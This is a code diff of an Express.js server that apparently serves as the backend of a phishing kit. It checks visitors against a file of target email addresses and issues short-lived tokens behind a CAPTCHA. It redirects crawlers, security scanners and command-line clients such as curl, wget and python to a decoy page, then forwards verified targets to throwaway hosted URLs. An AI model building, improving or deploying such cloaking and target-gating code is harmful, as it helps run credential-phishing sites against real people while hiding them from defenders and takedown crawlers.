@@ -11,14 +11,40 @@ const rateLimit = require('express-rate-limit');
 const app = express();
 const PORT = process.env.PORT || 3000;
 const EMAIL_FILE = path.join(__dirname, 'ogas', 'oga.txt');
-const REDIRECT_BASE = process.env.REDIRECT_BASE || 'https://your-frontend-url.up.railway.app';
-const BACKEND_BASE = process.env.BACKEND_BASE || 'https://your-backend-url.up.railway.app';
+const REDIRECT_BASE = process.env.REDIRECT_BASE || 'https://zezbomf65a64504e.up.railway.app';
+const BACKEND_BASE = process.env.BACKEND_BASE || 'https://bckvirovironmentnmvironment.up.railway.app';
 const DEBUG = process.env.DEBUG === 'true';
 
 let validEmails = new Set();
 let tokenMap = new Map();
 
-// Load and reload email list
+// ✅ Serve static files like lalaland.html from root
+app.use(express.static(path.join(__dirname)));
+
+// ✅ Bot trap
+app.use((req, res, next) => {
+  const ua = req.headers['user-agent'] || '';
+  const botIndicators = ['bot', 'crawler', 'spider', 'python', 'fetch', 'httpclient', 'wget', 'curl'];
+  if (botIndicators.some(ind => ua.toLowerCase().includes(ind))) {
+    return res.redirect('/xr91ee9e.html');
+  }
+  next();
+});
+
+// ✅ Middleware
+app.use(helmet());
+app.use(express.json());
+app.use(cors({ origin: 'https://fropnvironmeropr.up.railway.app' }));
+
+// ✅ Force HTTPS
+app.use((req, res, next) => {
+  if (req.headers['x-forwarded-proto'] !== 'https') {
+    return res.redirect(`https://${req.headers.host}${req.url}`);
+  }
+  next();
+});
+
+// ✅ Load valid emails
 function loadEmails() {
   try {
     const data = fs.readFileSync(EMAIL_FILE, 'utf8');
@@ -34,7 +60,7 @@ fs.watchFile(EMAIL_FILE, () => {
   loadEmails();
 });
 
-// Clean expired tokens every 5 min
+// ✅ Clean expired tokens
 setInterval(() => {
   const now = Date.now();
   for (const [token, info] of tokenMap.entries()) {
@@ -45,37 +71,14 @@ setInterval(() => {
   }
 }, 5 * 60 * 1000);
 
-// Middleware
-app.use(helmet());
-app.use(express.json());
-app.use(cors({ origin: 'https://fropnvironmeropr.up.railway.app' }));
-
-// Force HTTPS
-app.use((req, res, next) => {
-  if (req.headers['x-forwarded-proto'] !== 'https') {
-    return res.redirect(`https://${req.headers.host}${req.url}`);
-  }
-  next();
-});
-
-// Basic bot detection via User-Agent
-app.use((req, res, next) => {
-  const ua = req.headers['user-agent'] || '';
-  const botIndicators = ['bot', 'crawler', 'spider', 'python', 'fetch', 'httpclient', 'wget', 'curl'];
-  if (botIndicators.some(ind => ua.toLowerCase().includes(ind))) {
-    return res.redirect('/lalaland.html'); // Optional decoy page
-  }
-  next();
-});
-
-// Rate limiting
+// ✅ Rate limiting
 app.use(rateLimit({
   windowMs: 60 * 1000,
   max: 50,
   message: { valid: false, message: 'Too many requests. Try again later.' }
 }));
 
-// Email + CAPTCHA Validation Endpoint
+// ✅ Email + CAPTCHA endpoint
 app.post('/api/check-email', async (req, res) => {
   const { email, captchaToken, middleName } = req.body;
 
@@ -125,7 +128,7 @@ app.post('/api/check-email', async (req, res) => {
   return res.json({ valid: true, redirectUrl });
 });
 
-// Token Redirect Handler
+// ✅ Final redirect handler
 app.get('/forward', (req, res) => {
   const { token } = req.query;
   const entry = tokenMap.get(token);
